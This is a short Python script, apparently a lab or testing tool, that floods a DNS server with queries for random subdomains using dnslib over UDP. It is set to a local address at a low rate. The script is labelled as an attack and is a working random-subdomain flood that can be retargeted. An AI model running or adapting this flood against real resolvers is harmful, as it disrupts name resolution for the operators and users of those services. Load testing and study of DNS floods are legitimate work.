import os
import random
import time
import socket
from dnslib import DNSRecord, QTYPE, CLASS, RD

# Functions
def random_name():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=3)) + 'test.com' # change domain.com into already registered domain name.

# Flood Settings
flood_duration = 1  # Duration in seconds
flood_rate = 200  # Queries per second

# DNS Server settings
dns_server = '127.0.0.1'
dns_port = 53

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setblocking(0)

# Attack
start_time = time.time()
while True:
    current_time = time.time()
    elapsed_time = current_time - start_time

    if elapsed_time > flood_duration:
        break

    for i in range(flood_rate):
        # Create a random DNS request
        domain_name = random_name()
        print(f'-------------------------- state {i + 1 }: {domain_name}')
        qr = DNSRecord.question(domain_name)

        # Convert DNS request to bytes
        request = qr.pack()

        # Send request
        sock.sendto(request, (dns_server, dns_port))
        
        try:
            data, _ = sock.recvfrom(4096)
            
            # Parse response data
            dns_response = DNSRecord.parse(data)
            print(f'received data {dns_response}')

            # Extract answer from the DNS response
            for answer in dns_response.rr:
                print(f'Resolved {answer.rname} to {answer.rdata} with TTL {answer.ttl}')

        except socket.error:
            pass

    time.sleep(1)

sock.close()